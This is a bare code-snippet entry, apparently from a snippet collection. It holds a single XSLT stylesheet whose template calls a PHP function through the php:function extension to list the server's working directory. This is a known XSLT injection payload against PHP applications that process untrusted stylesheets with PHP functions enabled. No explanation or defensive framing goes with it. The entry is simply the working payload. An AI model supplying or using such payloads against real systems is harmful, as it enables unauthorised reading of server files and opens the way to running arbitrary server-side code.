---
id: d0fbf3c3-5549-4af3-a2bf-5ba8ca5114af
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:41.543202+00:00'
updated_at: '2023-04-10T20:24:49.324314+00:00'
---

# Code Snippet d0fbf3c3

**Language**: xml

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
        </xsl:template>
</xsl:stylesheet>
```


